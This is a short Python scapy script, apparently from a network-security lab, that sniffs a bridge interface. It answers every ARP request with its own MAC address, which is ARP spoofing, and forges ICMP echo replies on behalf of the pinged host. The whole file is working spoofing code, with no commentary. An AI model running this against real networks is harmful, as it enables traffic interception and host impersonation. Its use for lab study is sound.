#!/usr/bin/env python3
from scapy.all import *
from search_iface_by_prefx import *
  
interface = search_iface_by_prefx("br-", get_if_list())
print (f'the interface is {interface}')
mac_address = get_if_hwaddr(interface)
print(f'This machine mac address is: {mac_address}')

def handle_sniffing(pkt):
    #if ARP in pkt and pkt[ARP].op == 1:  # ARP request
    if ARP in pkt:  # ARP request
        print ("an ARP request arrived!")
        pkt.show()          
        arp_reply = ARP(op=2, hwsrc=mac_address, psrc=pkt[ARP].pdst,hwdst=pkt[ARP].hwsrc, pdst=pkt[ARP].psrc)
        send(arp_reply, verbose=False)             
        print(f"Sent ARP reply for {pkt[ARP].pdst}")
        arp_reply.show()
    else: # ICMP request
        print ("an ICMP request arrived!")
        pkt.show()
        ip_reply = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        icmp_reply = ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)        
        fullreply = ip_reply/icmp_reply/pkt[Raw]
        send(fullreply, verbose=False)
        print ("ICMP reply sent!")
        fullreply.show()

pkt = sniff(iface=interface, filter='arp[6:2] = 1 or icmp[icmptype] = 8', prn=handle_sniffing)



